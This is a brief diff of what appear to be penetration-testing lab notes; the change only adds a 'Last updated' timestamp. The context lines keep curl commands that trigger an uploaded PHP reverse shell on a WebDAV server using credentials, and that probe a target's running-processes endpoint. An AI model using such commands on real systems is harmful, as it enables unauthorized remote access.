@@ -51,3 +51,6 @@ curl http://$TARGET/webdav/php-reverse-shell.php -u $USER:$PASSWORD
 ```bash - kali
 curl -siX POST -H 'Content-Length: 0' http://$TARGET:80/running-proccesses
 ```
+
+
+Last updated: `$= dv.current().file.mtime.toFormat("MMMM dd, yyyy 'at' HH:mm")`
